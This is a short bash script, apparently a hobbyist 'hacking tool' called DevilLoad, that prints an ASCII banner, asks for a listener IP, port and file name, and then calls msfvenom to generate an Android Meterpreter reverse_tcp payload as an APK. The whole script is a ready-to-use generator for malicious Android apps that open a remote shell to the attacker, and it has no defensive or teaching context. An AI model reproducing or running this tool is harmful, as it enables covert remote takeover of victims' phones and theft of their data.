#!/bin/bash

resize -s 70 100 > /dev/null
#colors
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  
GREENBG="$(printf '\033[42m')"  
ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"  
WHITEBG="$(printf '\033[47m')" 
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
clear
echo -e $MAGENTA       "============================================================="
echo -e $CYAN             " ____             _ _ _                    _ " 
echo -e $CYAN             "|  _ \  _____   _(_) | |    ___   __ _  __| |"
echo -e $CYAN             "| | | |/ _ \ \ / / | | |   / _ \ /    |/    |"
echo -e $CYAN             "| |_| |  __/\ V /| | | |__| (_) | (_| | (_| |"
echo -e $CYAN             "|____/ \___| \_/ |_|_|_____\___/ \__,_|\__,_|"
echo -e $CYAN             "                                             "
echo -e                   "        VERSION : 2.0            "
echo
echo -e $CYAN         "............>>>>>> CODED BY: D4RKD3V7L <<<<<<.............."                                             
echo
echo -e   [        WARNING!!!! THIS TOOL SUPPORT ONLY FOR ANDROID .exe WILL ADDED FUTURE                ]   
echo
echo -e $BLUEBG "Enter your local IP for LHOST: "
read lh
echo
echo
echo -e $BLUEBG "Enter your port numer for LPORT: "
read lport
echo
echo
echo -e  "Enter your apk file name here [with extension!!!!!]: "
read apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lport R>$apk
echo
echo
echo
echo -e $BLACK "______________________________________THANKS FOR USING MY TOOL______________________________________"
